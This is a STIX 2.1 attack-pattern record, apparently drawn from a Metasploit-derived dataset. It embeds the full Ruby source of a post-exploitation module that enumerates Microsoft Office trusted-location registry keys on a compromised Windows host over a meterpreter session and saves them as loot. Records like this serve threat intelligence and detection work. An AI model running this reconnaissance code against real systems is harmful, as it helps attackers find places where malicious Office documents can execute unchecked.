{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26b5ee42-753d-4ae1-b420-b23c739249d0",
    "created": "2024-08-14T16:33:05.019834Z",
    "modified": "2024-08-14T16:33:05.019838Z",
    "name": "Windows Gather Microsoft Office Trusted Locations",
    "description": "This module will enumerate the Microsoft Office trusted locations on the target host. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_trusted_locations.rb",
            "external_id": "enum_trusted_locations.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Common\n\n  OFFICE_REGISTRY_PATH = 'HKCU\\\\SOFTWARE\\\\Microsoft\\\\Office'\n  TRUSTED_LOCATIONS_PATH = 'Security\\\\Trusted Locations'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Microsoft Office Trusted Locations',\n        'Description' => %q{ This module will enumerate the Microsoft Office trusted locations on the target host. },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'vysec <vincent.yiu[at]mwrinfosecurity.com>' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def print_status(msg = '')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_good(msg = '')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def run\n    locations = ''\n    [REGISTRY_VIEW_64_BIT, REGISTRY_VIEW_32_BIT].each do |registry_arch|\n      arch = registry_arch == REGISTRY_VIEW_64_BIT ? ARCH_X64 : ARCH_X86\n      reg_keys = registry_enumkeys(OFFICE_REGISTRY_PATH, registry_arch)\n      if reg_keys.nil?\n        print_error(\"Failed to enumerate Office in #{arch} registry hive.\")\n        return\n      end\n\n      reg_keys.each do |version|\n        next if /[0-9][0-9].0/.match(version).nil?\n\n        print_status(\"Version found: #{version}\")\n        version_path = \"#{OFFICE_REGISTRY_PATH}\\\\#{version}\"\n        applications = registry_enumkeys(version_path, registry_arch)\n\n        if applications.nil?\n          print_status('Failed to enumerate applications.')\n          next\n        end\n\n        vprint_status('Found applications.')\n        # find version to use\n        applications.each do |application|\n          trusted_locations_path = \"#{version_path}\\\\#{application}\\\\#{TRUSTED_LOCATIONS_PATH}\"\n          trusted_locations = registry_enumkeys(trusted_locations_path, registry_arch)\n          next if trusted_locations.nil?\n\n          print_good(\"Found trusted locations in #{application}\")\n          # find version to use\n          trusted_locations.each do |location|\n            location_path = \"#{trusted_locations_path}\\\\#{location}\"\n            description = registry_getvaldata(location_path, 'Description', registry_arch)\n            allow_subfolders = registry_getvaldata(location_path, 'AllowSubFolders', registry_arch)\n            path = registry_getvaldata(location_path, 'Path', registry_arch)\n            vprint_status(\"Description: #{description}\")\n            result = \"Application: #{application}, Path: #{path}, AllSubFolders: #{!allow_subfolders.nil?}\"\n            locations << \"#{result}\\n\"\n            print_status(result)\n          end\n        end\n      end\n      path = store_loot('host.trusted_locations', 'text/plain', session, locations, 'trusted_locations.txt', 'Trusted Locations')\n      print_good(\"Results stored in: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}